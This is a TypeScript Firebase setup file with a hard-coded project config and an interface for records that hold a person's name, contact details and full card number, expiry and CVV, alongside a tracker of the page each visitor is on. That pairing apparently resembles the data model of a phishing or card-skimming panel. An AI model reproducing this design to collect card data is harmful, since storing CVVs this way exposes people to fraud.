import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDrhe-QbEWpFOziW7ZtstZkZgSUN7DrIDM",
  authDomain: "zzz-2026.firebaseapp.com",
  databaseURL: "https://zzz-2026-default-rtdb.firebaseio.com",
  projectId: "zzz-2026",
  storageBucket: "zzz-2026.firebasestorage.app",
  messagingSenderId: "230451940376",
  appId: "1:230451940376:web:47de4485052a1090d0c76d",
  measurementId: "G-KPZ9NQPS26"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

